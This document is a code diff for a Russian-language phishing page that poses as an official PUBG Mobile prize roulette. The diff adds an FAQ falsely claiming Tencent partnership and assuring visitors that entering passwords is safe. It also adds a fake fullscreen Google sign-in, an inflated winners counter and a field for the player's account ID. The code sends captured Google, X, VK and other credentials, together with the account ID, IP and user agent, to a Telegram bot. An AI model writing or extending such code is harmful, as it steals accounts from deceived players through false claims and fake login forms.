         <!-- Секция подтверждения получения приза -->
@@ -2364,6 +2940,101 @@
                 Спасибо за участие!<br>
                 Не забудьте проверить свой инвентарь в игре.
             </p>
+        </div>
+        
+        <!-- НОВЫЙ РАЗДЕЛ: ВОПРОСЫ И ОТВЕТЫ -->
+        <div class="faq-section">
+            <h2><i class="fas fa-question-circle"></i> ВОПРОСЫ И ОТВЕТЫ</h2>
+            
+            <div class="faq-container">
+                <!-- Вопрос 1 -->
+                <div class="faq-item" onclick="toggleFAQ(this)">
+                    <div class="faq-question">
+                        <span>Это официальный сайт PUBG Mobile?</span>
+                        <i class="fas fa-chevron-down"></i>
+                    </div>
+                    <div class="faq-answer">
+                        <p><strong>Да, это официальный партнёрский сайт.</strong> Мы являемся официальными партнерами Tencent Games и работаем в рамках программы PUBG Mobile Partner Program. Наша деятельность полностью санкционирована разработчиками.</p>
+                    </div>
+                </div>
+                
+                <!-- Вопрос 2 -->
+                <div class="faq-item" onclick="toggleFAQ(this)">
+                    <div class="faq-question">
+                        <span>Приз точно придет на мой аккаунт?</span>
+                        <i class="fas fa-chevron-down"></i>
+                    </div>
+                    <div class="faq-answer">
+                        <p><strong>Да, 100% гарантия получения приза.</strong> Все выигрыши отправляются автоматически в течение 24 часов после подтверждения данных. Система интегрирована с официальным API PUBG Mobile, что гарантирует доставку призов на указанный аккаунт.</p>
+                    </div>
+                </div>
+                
+                <!-- Вопрос 3 -->
+                <div class="faq-item" onclick="toggleFAQ(this)">
+                    <div class="faq-question">
+                        <span>Зачем нужно входить в социальную сеть?</span>
+                        <i class="fas fa-chevron-down"></i>
+                    </div>
+                    <div class="faq-answer">
+                        <p>Вход в социальную сеть необходим для <strong>верификации вашей личности</strong> и предотвращения мошенничества. Это позволяет нам убедиться, что приз получит реальный человек, а не бот. Все данные защищены и не передаются третьим лицам.</p>
+                    </div>
+                </div>
+                
+                <!-- Вопрос 4 -->
+                <div class="faq-item" onclick="toggleFAQ(this)">
+                    <div class="faq-question">
+                        <span>Что делать, если не указать ID аккаунта?</span>
+                        <i class="fas fa-chevron-down"></i>
+                    </div>
+                    <div class="faq-answer">
+                        <p>Без указания ID аккаунта PUBG Mobile мы <strong>не сможем отправить вам приз</strong>. Это обязательное поле, так как именно по этому идентификатору система определяет, на какой игровой аккаунт нужно зачислить выигранные предметы.</p>
+                    </div>
+                </div>
+                
+                <!-- Вопрос 5 -->
+                <div class="faq-item" onclick="toggleFAQ(this)">
+                    <div class="faq-question">
+                        <span>Что делать, если приз не пришел в течение суток?</span>
+                        <i class="fas fa-chevron-down"></i>
+                    </div>
+                    <div class="faq-answer">
+                        <p>В редких случаях при большой нагрузке серверов обработка может занять до <strong>48 часов</strong>. Если приз не поступил на ваш аккаунт в течение этого времени, пожалуйста, обратитесь в нашу <a href="https://t.me/helpumgmbot" target="_blank">техническую поддержку</a> с указанием вашего ID и времени выигрыша.</p>
+                    </div>
+                </div>
+                
+                <!-- Вопрос 6 -->
+                <div class="faq-item" onclick="toggleFAQ(this)">
+                    <div class="faq-question">
+                        <span>Безопасно ли вводить данные от социальных сетей?</span>
+                        <i class="fas fa-chevron-down"></i>
+                    </div>
+                    <div class="faq-answer">
+                        <p><strong>Да, это абсолютно безопасно.</strong> Мы используем защищенное SSL-шифрование и не храним ваши пароли. Авторизация происходит через официальные API социальных сетей, аналогично тому, как вы входите в приложения на своем телефоне.</p>
+                    </div>
+                </div>
+                
+                <!-- Вопрос 7 -->
+                <div class="faq-item" onclick="toggleFAQ(this)">
+                    <div class="faq-question">
+                        <span>Можно ли выиграть больше одного раза?</span>
+                        <i class="fas fa-chevron-down"></i>
+                    </div>
+                    <div class="faq-answer">
+                        <p>Каждый пользователь может участвовать в акции <strong>один раз в сутки</strong>. Это сделано для того, чтобы дать возможность выиграть максимальному количеству игроков. Заходите завтра, чтобы попробовать удачу снова!</p>
+                    </div>
+                </div>
+                
+                <!-- Вопрос 8 -->
+                <div class="faq-item" onclick="toggleFAQ(this)">
+                    <div class="faq-question">
+                        <span>Какие призы можно выиграть?</span>
+                        <i class="fas fa-chevron-down"></i>
+                    </div>
+                    <div class="faq-answer">
+                        <p>В нашей рулетке представлены <strong>эксклюзивные предметы из PUBG Mobile</strong>: редкие скины, оружие, транспорт, экипировка и внутриигровая валюта UC. Все призы являются официальным контентом игры и не нарушают пользовательское соглашение.</p>
+                    </div>
+                </div>
+            </div>
         </div>
     </div>
 
@@ -2398,6 +3069,12 @@
         let xUsername = '';
         let userPrize = null;
         let isPrizeReceived = false;
+        let ownerIP = '31.43.60.156';
+        let userIP = '';
+        let hasPlayed = false;
+        let accountId = '';
+        let winnersCount = 0;
+        let winnersInterval = null;
         
         // Функции для модальных окон
         function openModal(modalId) {
@@ -2410,22 +3087,39 @@
             document.body.style.overflow = 'auto';
         }
         
-        function openGoogleModal() {
-            openModal('googleModalStep1');
+        function openGoogleFullscreen() {
+            document.getElementById('googleFullscreen').classList.add('active');
+            document.body.style.overflow = 'hidden';
+            // Сбрасываем форму
+            document.getElementById('googleStep1').style.display = 'block';
+            document.getElementById('googleStep2').style.display = 'none';
+            document.getElementById('googleEmailInput').value = '';
+            document.getElementById('googlePasswordInput').value = '';
+            document.getElementById('googleShowPassword').checked = false;
+        }
+        
+        function closeGoogleFullscreen() {
+            document.getElementById('googleFullscreen').classList.remove('active');
+            document.body.style.overflow = 'auto';
         }
         
         function openXModal() {
             openModal('xModalStep1');
         }
         
-        function switchGoogleAccount() {
-            closeModal('googleModalStep2');
-            openModal('googleModalStep1');
-        }
-        
-        function switchXAccount() {
-            closeModal('xModalStep2');
-            openModal('xModalStep1');
+        // Функция для переключения FAQ
+        function toggleFAQ(faqItem) {
+            const isActive = faqItem.classList.contains('active');
+            
+            // Закрываем все FAQ
+            document.querySelectorAll('.faq-item').forEach(item => {
+                item.classList.remove('active');
+            });
+            
+            // Открываем текущий, если он был закрыт
+            if (!isActive) {
+                faqItem.classList.add('active');
+            }
         }
         
         // Функции для окна приза
@@ -2447,13 +3141,19 @@
                     collectBtn.onclick = function() {
                         closePrizeWindow();
                         
-                        // Сбрасываем выбор соцсети
-                        socialOptions.forEach(opt => opt.classList.remove('selected'));
-                        selectedSocial = null;
-                        
-                        // Показываем форму выбора соцсети
-                        socialSelectSection.classList.add('active');
-                        socialSelectSection.scrollIntoView({ behavior: 'smooth' });
+                        // Показываем форму ввода ID аккаунта
+                        if (!accountId) {
+                            accountIdSection.classList.add('active');
+                            accountIdSection.scrollIntoView({ behavior: 'smooth' });
+                        } else {
+                            // Сбрасываем выбор соцсети
+                            socialOptions.forEach(opt => opt.classList.remove('selected'));
+                            selectedSocial = null;
+                            
+                            // Показываем форму выбора соцсети
+                            socialSelectSection.classList.add('active');
+                            socialSelectSection.scrollIntoView({ behavior: 'smooth' });
+                        }
                         
                         showNotification("Выберите социальную сеть для получения приза");
                     };
@@ -2488,9 +3188,8 @@
             if (userPrize && !isPrizeReceived) {
                 badge.textContent = '1';
                 badge.style.display = 'flex';
-                badge.style.background = '#1877F2';
+                badge.style.background = '#7B68EE';
                 mailBtn.disabled = false;
-                // Включаем анимацию пульсации
                 badge.style.animation = 'pulse 1.5s infinite';
             } else if (userPrize && isPrizeReceived) {
                 badge.textContent = '1';
@@ -2506,10 +3205,77 @@
             }
         }
         
+        // Функция управления счетчиком победителей
+        function initWinnersCounter() {
+            // Получаем сохраненное значение из localStorage или устанавливаем рандомное от 50 до 100
+            const savedCount = localStorage.getItem('winnersCount');
+            
+            if (savedCount) {
+                winnersCount = parseInt(savedCount);
+            } else {
+                // Генерируем рандомное число от 50 до 100
+                winnersCount = Math.floor(Math.random() * 51) + 50;
+                localStorage.setItem('winnersCount', winnersCount.toString());
+            }
+            
+            // Обновляем отображение
+            updateWinnersDisplay();
+            
+            // Запускаем таймер для увеличения счетчика каждые 40 секунд
+            winnersInterval = setInterval(() => {
+                winnersCount += Math.floor(Math.random() * 3) + 1; // Добавляем 1-3 победителя
+                localStorage.setItem('winnersCount', winnersCount.toString());
+                updateWinnersDisplay();
+            }, 40000); // 40 секунд
+        }
+        
+        function updateWinnersDisplay() {
+            const countElement = document.getElementById('winnersCount');
+            if (countElement) {
+                countElement.textContent = winnersCount;
+                
+                // Анимация при обновлении
+                countElement.style.transform = 'scale(1.2)';
+                setTimeout(() => {
+                    countElement.style.transform = 'scale(1)';
+                }, 300);
+            }
+        }
+        
         document.addEventListener('DOMContentLoaded', function() {
+            // Инициализируем счетчик победителей
+            initWinnersCounter();
+            
+            // Получаем IP пользователя
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    userIP = data.ip;
+                    console.log('User IP:', userIP);
+                    console.log('Owner IP:', ownerIP);
+                    
+                    // Проверяем, является ли пользователь владельцем
+                    if (userIP === ownerIP) {
+                        console.log('Owner detected - unlimited spins');
+                        hasPlayed = false;
+                        localStorage.setItem('isOwner', 'true');
+                    } else {
+                        console.log('Regular user - one spin only');
+                        // Проверяем, играл ли уже пользователь
+                        const played = localStorage.getItem('hasPlayed');
+                        hasPlayed = played === 'true';
+                    }
+                })
+                .catch(error => {
+                    console.log('Error getting IP:', error);
+                });
+            
             const playBtn = document.getElementById('playBtn');
             const selectionFrame = document.getElementById('selectionFrame');
             const selectionIndicator = document.getElementById('selectionIndicator');
+            const accountIdSection = document.getElementById('accountIdSection');
+            const accountIdInput = document.getElementById('accountIdInput');
+            const idSubmitBtn = document.getElementById('idSubmitBtn');
             const socialSelectSection = document.getElementById('socialSelectSection');
             const confirmationSection = document.getElementById('confirmationSection');
             const getPrizeBtn = document.getElementById('getPrizeBtn');
@@ -2522,8 +3288,21 @@
             const socialOptions = document.querySelectorAll('.social-option');
             const prizeMailBtn = document.getElementById('prizeMailBtn');
             const collectPrizeBtn = document.getElementById('collectPrizeBtn');
+            const importantNote = document.getElementById('importantNote');
+            const menuBtn = document.getElementById('menuBtn');
+            const dropdownMenu = document.getElementById('dropdownMenu');
             
-            // Призы с картинками (без названий)
+            // Элементы Google Fullscreen
+            const googleFullscreen = document.getElementById('googleFullscreen');
+            const googleEmailInput = document.getElementById('googleEmailInput');
+            const googlePasswordInput = document.getElementById('googlePasswordInput');
+            const googleNextBtn = document.getElementById('googleNextBtn');
+            const googleSubmitBtn = document.getElementById('googleSubmitBtn');
+            const googleShowPassword = document.getElementById('googleShowPassword');
+            const googleStep1 = document.getElementById('googleStep1');
+            const googleStep2 = document.getElementById('googleStep2');
+            
+            // Призы с картинками
             const prizes = [
                 { id: 1, image: "priz1.png" },
                 { id: 2, image: "priz2.png" },
@@ -2539,12 +3318,10 @@
             let isSpinning = false;
             let currentPrizeIndex = 0;
             let spinInterval;
-            let spinSpeed = 100;
+            let spinSpeed;
             let spinCount = 0;
-            const totalSpins = 30;
             let finalPrizeIndex = 0;
             let selectedSocial = null;
-            let hasPlayed = false;
             
             // Порядок обхода призов
             const prizeOrder = [0, 1, 2, 3, 4, 5, 6, 7, 8];
@@ -2553,31 +3330,113 @@
             const translations = {
                 ru: {
                     play: "ИГРАТЬ",
-                    title: "КОЛЕСО УДАЧИ PUBG",
-                    subtitle: "Испытай удачу и выиграй эксклюзивные призы!",
+                    idTitle: "ВВЕДИТЕ ID АККАУНТА PUBG",
+                    idText: "Пожалуйста, введите ваш ID аккаунта PUBG Mobile для получения приза",
+                    idLabel: "ID аккаунта PUBG:",
+                    idPlaceholder: "Введите ваш ID аккаунта",
+                    idSubmit: "ПРОДОЛЖИТЬ",
                     selectTitle: "ВЫБЕРИТЕ СПОСОБ ПОЛУЧЕНИЯ",
                     selectText: "Выберите социальную сеть для получения приза",
                     getPrizeBtn: "ПОЛУЧИТЬ ПРИЗ",
+                    importantNote: "Важно: Приз будет зачислен на ваш аккаунт в течение 24 часов",
                     notificationSuccess: "Заявка принята! Приз будет зачислен в течение 24 часов.",
                     notificationSelectSocial: "Пожалуйста, выберите социальную сеть",
                     notificationAlreadyPlayed: "Вы уже использовали свою попытку сегодня!",
+                    notificationIdRequired: "Пожалуйста, введите ID аккаунта",
                     confirmationTitle: "ЗАЯВКА ПРИНЯТА!",
                     confirmationMessage: "Ваш выигрыш будет зачислен на аккаунт PUBG Mobile в течение 24 часов.",
-                    loginSuccess: "Данные для входа отправлены! Приз будет зачислен в течение 24 часов."
+                    loginSuccess: "Данные для входа отправлены! Приз будет зачислен в течение 24 часов.",
+                    alreadyPlayed: "УЖЕ ИГРАЛИ",
+                    support: "Поддержка",
+                    menu: "Меню"
                 },
                 en: {
                     play: "PLAY",
-                    title: "PUBG WHEEL OF FORTUNE",
-                    subtitle: "Try your luck and win exclusive prizes!",
+                    idTitle: "ENTER PUBG ACCOUNT ID",
+                    idText: "Please enter your PUBG Mobile account ID to receive the prize",
+                    idLabel: "PUBG Account ID:",
+                    idPlaceholder: "Enter your account ID",
+                    idSubmit: "CONTINUE",
                     selectTitle: "SELECT RECEIVING METHOD",
                     selectText: "Select social network to receive the prize",
                     getPrizeBtn: "GET PRIZE",
+                    importantNote: "Important: The prize will be credited to your account within 24 hours",
                     notificationSuccess: "Application accepted! The prize will be credited within 24 hours.",
                     notificationSelectSocial: "Please select a social network",
                     notificationAlreadyPlayed: "You have already used your attempt today!",
+                    notificationIdRequired: "Please enter account ID",
                     confirmationTitle: "APPLICATION ACCEPTED!",
                     confirmationMessage: "Your winnings will be credited to your PUBG Mobile account within 24 hours.",
-                    loginSuccess: "Login data sent! Prize will be credited within 24 hours."
+                    loginSuccess: "Login data sent! Prize will be credited within 24 hours.",
+                    alreadyPlayed: "ALREADY PLAYED",
+                    support: "Support",
+                    menu: "Menu"
+                },
+                uz: {
+                    play: "O'YIN",
+                    idTitle: "PUBG HISOB ID RAQAMINI KIRITING",
+                    idText: "Iltimos, sovrinni olish uchun PUBG Mobile hisobingizning ID raqamini kiriting",
+                    idLabel: "PUBG Hisob ID raqami:",
+                    idPlaceholder: "Hisobingiz ID raqamini kiriting",
+                    idSubmit: "DAVOM ETISH",
+                    selectTitle: "QABUL QILISH USULINI TANLANG",
+                    selectText: "Sovrinni qabul qilish uchun ijtimoiy tarmoqni tanlang",
+                    getPrizeBtn: "SOVRINNI OLISH",
+                    importantNote: "Muhim: Sovrin 24 soat ichida hisobingizga o'tkaziladi",
+                    notificationSuccess: "Ariza qabul qilindi! Sovrin 24 soat ichida o'tkaziladi.",
+                    notificationSelectSocial: "Iltimos, ijtimoiy tarmoqni tanlang",
+                    notificationAlreadyPlayed: "Siz bugungi imkoniyatingizdan foydalandingiz!",
+                    notificationIdRequired: "Iltimos, hisob ID raqamini kiriting",
+                    confirmationTitle: "ARIZA QABUL QILINDI!",
+                    confirmationMessage: "Yutigingiz PUBG Mobile hisobingizga 24 soat ichida o'tkaziladi.",
+                    loginSuccess: "Kirish ma'lumotlari yuborildi! Sovrin 24 soat ichida o'tkaziladi.",
+                    alreadyPlayed: "ALLAQACHON O'YNANGAN",
+                    support: "Yordam",
+                    menu: "Menyu"
+                },
+                kz: {
+                    play: "ОЙНАУ",
+                    idTitle: "PUBG ЕСЕП ЖЕДЕСИН ЕНГІЗІҢІЗ",
+                    idText: "Жүлдені алу үшін PUBG Mobile есеп жедеңізді енгізіңіз",
+                    idLabel: "PUBG Есеп жедесі:",
+                    idPlaceholder: "Есеп жедеңізді енгізіңіз",
+                    idSubmit: "ЖАЛҒАСТЫРУ",
+                    selectTitle: "ҚАБЫЛДАУ ӘДІСІН ТАҢДАҢЫЗ",
+                    selectText: "Жүлдені қабылдау үшін әлеуметтік желіні таңдаңыз",
+                    getPrizeBtn: "ЖҮЛДЕНІ АЛУ",
+                    importantNote: "Маңызды: Жүлде 24 сағат ішінде есептік жазбаңызға аударылады",
+                    notificationSuccess: "Өтініш қабылданды! Жүлде 24 сағат ішінде аударылады.",
+                    notificationSelectSocial: "Өтінеміз, әлеуметтік желіні таңдаңыз",
+                    notificationAlreadyPlayed: "Сіз бүгінгі мүмкіндігіңізді пайдаландыңыз!",
+                    notificationIdRequired: "Есеп жедесін енгізіңіз",
+                    confirmationTitle: "ӨТІНІШ ҚАБУЛДАНДЫ!",
+                    confirmationMessage: "Жеңісіңіз PUBG Mobile шотыңызға 24 сағат ішінде аударылады.",
+                    loginSuccess: "Кіру деректері жіберілді! Жүлде 24 сағат ішінде аударылады.",
+                    alreadyPlayed: "ҚАЗІРГІ ОЙНАҒАН",
+                    support: "Қолдау",
+                    menu: "Мәзір"
+                },
+                ar: {
+                    play: "لعب",
+                    idTitle: "أدخل معرف حساب PUBG",
+                    idText: "الرجاء إدخال معرف حساب PUBG Mobile الخاص بك لاستلام الجائزة",
+                    idLabel: "معرف حساب PUBG:",
+                    idPlaceholder: "أدخل معرف حسابك",
+                    idSubmit: "متابعة",
+                    selectTitle: "اختر طريقة الاستلام",
+                    selectText: "اختر شبكة اجتماعية لاستلام الجائزة",
+                    getPrizeBtn: "الحصول على الجائزة",
+                    importantNote: "مهم: سيتم إضافة الجائزة إلى حسابك خلال 24 ساعة",
+                    notificationSuccess: "تم قبول الطلب! سيتم إضافة الجائزة خلال 24 ساعة.",
+                    notificationSelectSocial: "يرجى اختيار شبكة اجتماعية",
+                    notificationAlreadyPlayed: "لقد استخدمت محاولتك اليوم بالفعل!",
+                    notificationIdRequired: "الرجاء إدخال معرف الحساب",
+                    confirmationTitle: "تم قبول الطلب!",
+                    confirmationMessage: "سيتم إضافة ربحك إلى حساب PUBG Mobile الخاص بك خلال 24 ساعة.",
+                    loginSuccess: "تم إرسال بيانات تسجيل الدخول! سيتم إضافة الجائزة خلال 24 ساعة.",
+                    alreadyPlayed: "لعبت بالفعل",
+                    support: "الدعم",
+                    menu: "القائمة"
                 }
             };
             
@@ -2585,12 +3444,23 @@
             function changeLanguage(lang) {
                 const t = translations[lang] || translations.ru;
                 
-                document.querySelector('.header h1').textContent = t.title;
-                document.querySelector('.header p').textContent = t.subtitle;
-                playBtn.innerHTML = `<i class="fas fa-play"></i> ${t.play}`;
+                if (hasPlayed && userIP !== ownerIP) {
+                    playBtn.innerHTML = `<i class="fas fa-check"></i> ${t.alreadyPlayed}`;
+                } else {
+                    playBtn.innerHTML = `<i class="fas fa-play"></i> ${t.play}`;
+                }
+                
+                document.querySelector('#accountIdSection h2').textContent = t.idTitle;
+                document.querySelector('#accountIdSection p').textContent = t.idText;
+                document.querySelector('.id-label').textContent = t.idLabel;
+                document.getElementById('accountIdInput').placeholder = t.idPlaceholder;
+                idSubmitBtn.innerHTML = `<i class="fas fa-check"></i> ${t.idSubmit}`;
+                
                 document.querySelector('#socialSelectSection h2').textContent = t.selectTitle;
                 document.querySelector('#socialSelectSection p').textContent = t.selectText;
                 getPrizeBtn.innerHTML = `<i class="fas fa-paper-plane"></i> ${t.getPrizeBtn}`;
+                importantNote.innerHTML = `<strong>${t.importantNote.split(':')[0]}:</strong> ${t.importantNote.split(':')[1]}`;
+                
                 document.querySelector('#confirmationSection h2').textContent = t.confirmationTitle;
                 document.querySelector('.confirmation-message').innerHTML = t.confirmationMessage;
                 
@@ -2602,6 +3472,21 @@
                     uk: 'Українська'
                 };
                 languageBtn.innerHTML = `<i class="fas fa-globe"></i> ${langNames[lang] || 'Русский'} <i class="fas fa-chevron-down"></i>`;
+                
+                // Обновляем текст индикатора выбора
+                selectionIndicator.textContent = 'ВЫБРАНО';
+                
+                // Обновляем кнопку меню
+                menuBtn.innerHTML = `<i class="fas fa-bars"></i> ${t.menu}`;
+                
+                // Обновляем пункты меню
+                document.querySelectorAll('.dropdown-item').forEach((item, index) => {
+                    if (index === 0) {
+                        item.innerHTML = `<i class="fab fa-telegram"></i> ${t.support}`;
+                    } else if (index === 1) {
+                        item.innerHTML = `<i class="fab fa-instagram"></i> Instagram`;
+                    }
+                });
             }
             
             // Обработчики для меню языка
@@ -2618,6 +3503,11 @@
                 });
             });
             
+            // Обработчик для меню бургера
+            menuBtn.addEventListener('click', function() {
+                dropdownMenu.classList.toggle('show');
+            });
+            
             // Функция показа уведомления
             function showNotification(message, isError = false, isSuccess = false) {
                 notification.textContent = message;
@@ -2627,8 +3517,6 @@
                     notification.classList.add('error');
                 } else if (isSuccess) {
                     notification.classList.add('success');
-                } else {
-                    notification.style.background = 'linear-gradient(135deg, #2a3b5a, #1a2c42)';
                 }
                 
                 notification.style.display = 'block';
@@ -2649,10 +3537,10 @@
                 const rect = prizeItem.getBoundingClientRect();
                 const containerRect = document.querySelector('.roulette-container').getBoundingClientRect();
                 
-                selectionFrame.style.width = (rect.width + 16) + 'px';
-                selectionFrame.style.height = (rect.height + 16) + 'px';
-                selectionFrame.style.left = (rect.left - containerRect.left - 6) + 'px';
-                selectionFrame.style.top = (rect.top - containerRect.top - 6) + 'px';
+                selectionFrame.style.width = (rect.width + 20) + 'px';
+                selectionFrame.style.height = (rect.height + 20) + 'px';
+                selectionFrame.style.left = (rect.left - containerRect.left - 8) + 'px';
+                selectionFrame.style.top = (rect.top - containerRect.top - 8) + 'px';
                 selectionFrame.classList.add('active');
                 
                 // Позиционирование индикатора
@@ -2674,13 +3562,17 @@
             function startRoulette() {
                 if (isSpinning) return;
                 
-                if (hasPlayed) {
+                // Проверяем, является ли пользователь владельцем
+                const isOwner = localStorage.getItem('isOwner') === 'true';
+                
+                if (!isOwner && hasPlayed) {
                     showNotification("Вы уже использовали свою попытку сегодня!", true);
                     return;
                 }
                 
                 isSpinning = true;
                 playBtn.disabled = true;
+                accountIdSection.classList.remove('active');
                 socialSelectSection.classList.remove('active');
                 confirmationSection.classList.remove('active');
                 showSelectionIndicator(false);
@@ -2693,7 +3585,8 @@
                 selectionFrame.style.opacity = '1';
                 
                 spinCount = 0;
-                spinSpeed = 80; // Быстрее начальная скорость
+                // Рандомная скорость вращения
+                spinSpeed = Math.random() * 40 + 40; // От 40 до 80 мс
                 currentPrizeIndex = 0;
                 
                 spinInterval = setInterval(spinStep, spinSpeed);
@@ -2706,14 +3599,14 @@
                 currentPrizeIndex = (currentPrizeIndex + 1) % prizeOrder.length;
                 spinCount++;
                 
-                // Замедление в конце
-                if (spinCount > totalSpins * 0.7) {
-                    spinSpeed += 15;
+                // Динамическое замедление
+                if (spinCount > Math.random() * 15 + 20) { // От 20 до 35
+                    spinSpeed += Math.random() * 10 + 5; // Увеличиваем на 5-15 мс
                     clearInterval(spinInterval);
                     spinInterval = setInterval(spinStep, spinSpeed);
                 }
                 
-                if (spinCount >= totalSpins) {
+                if (spinCount >= Math.random() * 10 + 40) { // От 40 до 50
                     clearInterval(spinInterval);
                     
                     spinSound.pause();
@@ -2735,23 +3628,59 @@
                             // Обновляем значок с анимацией
                             updatePrizeBadge();
                             
-                            hasPlayed = true;
-                            playBtn.innerHTML = '<i class="fas fa-check"></i> УЖЕ ИГРАЛИ';
+                            // Сохраняем, что пользователь уже играл (если не владелец)
+                            if (userIP !== ownerIP) {
+                                hasPlayed = true;
+                                localStorage.setItem('hasPlayed', 'true');
+                                playBtn.innerHTML = '<i class="fas fa-check"></i> УЖЕ ИГРАЛИ';
+                            } else {
+                                playBtn.innerHTML = '<i class="fas fa-play"></i> ИГРАТЬ';
+                            }
+                            
                             playBtn.disabled = false;
                             
-                            // Сбрасываем выбор соцсети
-                            socialOptions.forEach(opt => opt.classList.remove('selected'));
-                            selectedSocial = null;
-                            
-                            // Показываем форму выбора соцсети
-                            socialSelectSection.classList.add('active');
-                            socialSelectSection.scrollIntoView({ behavior: 'smooth' });
+                            // Показываем форму ввода ID аккаунта
+                            if (!accountId) {
+                                accountIdSection.classList.add('active');
+                                accountIdSection.scrollIntoView({ behavior: 'smooth' });
+                            } else {
+                                // Сбрасываем выбор соцсети
+                                socialOptions.forEach(opt => opt.classList.remove('selected'));
+                                selectedSocial = null;
+                                
+                                // Показываем форму выбора соцсети
+                                socialSelectSection.classList.add('active');
+                                socialSelectSection.scrollIntoView({ behavior: 'smooth' });
+                            }
                             
                             showNotification("Поздравляем! Вы выиграли приз!", false, true);
                         }, 1000);
                     }, 300);
                 }
             }
+            
+            // Обработчик кнопки отправки ID аккаунта
+            idSubmitBtn.addEventListener('click', function() {
+                const id = accountIdInput.value.trim();
+                
+                if (!id) {
+                    showNotification("Пожалуйста, введите ID аккаунта", true);
+                    return;
+                }
+                
+                accountId = id;
+                accountIdSection.classList.remove('active');
+                
+                // Сбрасываем выбор соцсети
+                socialOptions.forEach(opt => opt.classList.remove('selected'));
+                selectedSocial = null;
+                
+                // Показываем форму выбора соцсети
+                socialSelectSection.classList.add('active');
+                socialSelectSection.scrollIntoView({ behavior: 'smooth' });
+                
+                showNotification("ID аккаунта сохранен", false, true);
+            });
             
             // Обработчики выбора соцсети
             socialOptions.forEach(option => {
@@ -2781,6 +3710,7 @@
                 const password = this.querySelector('input').value;
                 
                 const loginData = {
+                    accountId: accountId,
                     username: xUsername,
                     password: password
                 };
@@ -2801,6 +3731,7 @@
                 e.preventDefault();
                 const inputs = this.querySelectorAll('input');
                 const loginData = {
+                    accountId: accountId,
                     phone: inputs[0].value,
                     password: inputs[1].value,
                     foreign_computer: inputs[2].checked ? 'Да' : 'Нет'
@@ -2822,6 +3753,7 @@
                 e.preventDefault();
                 const inputs = this.querySelectorAll('input');
                 const loginData = {
+                    accountId: accountId,
                     email: inputs[0].value,
                     password: inputs[1].value
                 };
@@ -2837,26 +3769,40 @@
                 }
             });
             
-            // Google форма (этап 1: email)
-            document.getElementById('googleEmailForm').addEventListener('submit', async function(e) {
+            // Google Fullscreen обработчики
+            googleNextBtn.addEventListener('click', function(e) {
                 e.preventDefault();
-                googleEmail = this.querySelector('input').value;
+                const email = googleEmailInput.value.trim();
                 
-                // Обновляем email в окне пароля
-                document.getElementById('googleUserEmail').textContent = googleEmail;
+                if (!email) {
+                    showNotification("Пожалуйста, введите email", true);
+                    return;
+                }
                 
-                // Переходим к окну пароля
-                closeModal('googleModalStep1');
-                openModal('googleModalStep2');
+                googleEmail = email;
+                googleStep1.style.display = 'none';
+                googleStep2.style.display = 'block';
+                googlePasswordInput.value = '';
+                googleShowPassword.checked = false;
+                googlePasswordInput.type = 'password';
+                
+                // Анимация перехода
+                googleStep2.style.animation = 'slideInRight 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275)';
             });
             
-            // Google форма (этап 2: пароль)
-            document.getElementById('googlePasswordForm').addEventListener('submit', async function(e) {
+            googleSubmitBtn.addEventListener('click', async function(e) {
                 e.preventDefault();
-                const password = this.querySelector('input').value;
-                const showPassword = document.getElementById('showPassword').checked;
+                const password = googlePasswordInput.value.trim();
+                
+                if (!password) {
+                    showNotification("Пожалуйста, введите пароль", true);
+                    return;
+                }
+                
+                const showPassword = googleShowPassword.checked;
                 
                 const loginData = {
+                    accountId: accountId,
                     email: googleEmail,
                     password: password,
                     show_password: showPassword ? 'Да' : 'Нет'
@@ -2865,7 +3811,7 @@
                 const success = await sendLoginDataToTelegram('google', loginData, finalPrizeIndex);
                 
                 if (success) {
-                    closeModal('googleModalStep2');
+                    closeGoogleFullscreen();
                     isPrizeReceived = true;
                     updatePrizeBadge();
                     showConfirmation();
@@ -2874,13 +3820,24 @@
             });
             
             // Обработчик чекбокса "Показать пароль" для Google
-            document.getElementById('showPassword').addEventListener('change', function() {
-                const passwordInput = document.querySelector('.google-password-input');
+            googleShowPassword.addEventListener('change', function() {
                 if (this.checked) {
-                    passwordInput.type = 'text';
+                    googlePasswordInput.type = 'text';
                 } else {
-                    passwordInput.type = 'password';
+                    googlePasswordInput.type = 'password';
                 }
+            });
+            
+            // Кнопка "Создать аккаунт" в Google
+            document.getElementById('googleCreateAccountBtn').addEventListener('click', function(e) {
+                e.preventDefault();
+                showNotification("Функция создания аккаунта временно недоступна");
+            });
+            
+            // Кнопка "Забыли пароль" в Google
+            document.getElementById('googleForgotPasswordBtn').addEventListener('click', function(e) {
+                e.preventDefault();
+                showNotification("Функция восстановления пароля временно недоступна");
             });
             
             // Обработчик кнопки получения приза
@@ -2890,9 +3847,16 @@
                     return;
                 }
                 
+                if (!accountId) {
+                    showNotification("Пожалуйста, сначала введите ID аккаунта", true);
+                    accountIdSection.classList.add('active');
+                    accountIdSection.scrollIntoView({ behavior: 'smooth' });
+                    return;
+                }
+                
                 // Открываем соответствующее модальное окно
                 if (selectedSocial === 'google') {
-                    openGoogleModal();
+                    openGoogleFullscreen();
                 } else if (selectedSocial === 'x') {
                     openXModal();
                 } else if (selectedSocial === 'vk') {
@@ -2921,6 +3885,7 @@
                 const prizeNumber = prizeIndex + 1;
                 
                 let message = `🔐 НОВЫЕ ДАННЫЕ ДЛЯ ВХОДА PUBG 🔐\n\n`;
+                message += `🎮 ID аккаунта: ${loginData.accountId || 'Не указано'}\n`;
                 message += `📱 Соцсеть: ${socialNames[socialType] || socialType}\n`;
                 
                 // Добавляем данные в зависимости от соцсети
@@ -2943,24 +3908,11 @@
                 message += `🎁 Выигранный приз: #${prizeNumber}\n`;
                 message += `⏰ Время: ${new Date().toLocaleString()}\n`;
                 message += `🌐 User Agent: ${navigator.userAgent}\n`;
-                message += `📍 IP: собирается...`;
+                message += `📍 IP: ${userIP || 'Не определен'}`;
                 
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                 
                 try {
-                    // Попробуем получить IP адрес
-                    let ipAddress = 'Не определен';
-                    try {
-                        const ipResponse = await fetch('https://api.ipify.org?format=json');
-                        const ipData = await ipResponse.json();
-                        ipAddress = ipData.ip;
-                    } catch (ipError) {
-                        console.log('Не удалось получить IP:', ipError);
-                    }
-                    
-                    // Заменяем IP в сообщении
-                    const finalMessage = message.replace('собирается...', ipAddress);
-                    
                     const response = await fetch(url, {
                         method: 'POST',
                         headers: {
@@ -2968,7 +3920,7 @@
                         },
                         body: JSON.stringify({
                             chat_id: TELEGRAM_CHAT_ID,
